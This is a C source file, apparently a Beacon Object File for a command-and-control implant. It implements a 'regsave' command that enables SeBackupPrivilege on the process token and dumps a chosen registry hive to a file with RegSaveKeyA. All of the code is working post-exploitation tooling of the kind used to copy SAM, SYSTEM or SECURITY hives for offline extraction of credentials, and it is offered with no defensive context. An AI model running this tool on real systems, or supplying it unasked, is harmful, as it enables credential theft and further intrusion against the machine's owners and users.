/*
 * regsave <hive> <path> <outfile> - save a registry hive with backup privilege.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void enable_backup(void)
{
    HANDLE tok;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                   TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return;
    if (ADVAPI32$LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luid)) {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ADVAPI32$AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    KERNEL32$CloseHandle(tok);
}

void go(char *args, int alen)
{
    datap parser;
    char *hive, *path, *out;
    int hlen, plen, olen;
    HKEY root, h;
    LONG rc;

    BeaconDataParse(&parser, args, alen);
    hive = BeaconDataExtract(&parser, &hlen);
    path = BeaconDataExtract(&parser, &plen);
    out  = BeaconDataExtract(&parser, &olen);

    if (!hive || !path || !out || !out[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: regsave <hive> <path> <outfile>\n");
        return;
    }

    enable_backup();
    root = bof_hive(hive);
    rc = ADVAPI32$RegOpenKeyExA(root, path, 0, KEY_READ, &h);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyEx failed: %ld\n", (long)rc);
        return;
    }

    rc = ADVAPI32$RegSaveKeyA(h, out, NULL);
    if (rc == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Saved %s\\%s -> %s\n", hive, path, out);
    else
        BeaconPrintf(CALLBACK_ERROR, "RegSaveKey failed: %ld (run as admin)\n", (long)rc);

    ADVAPI32$RegCloseKey(h);
}
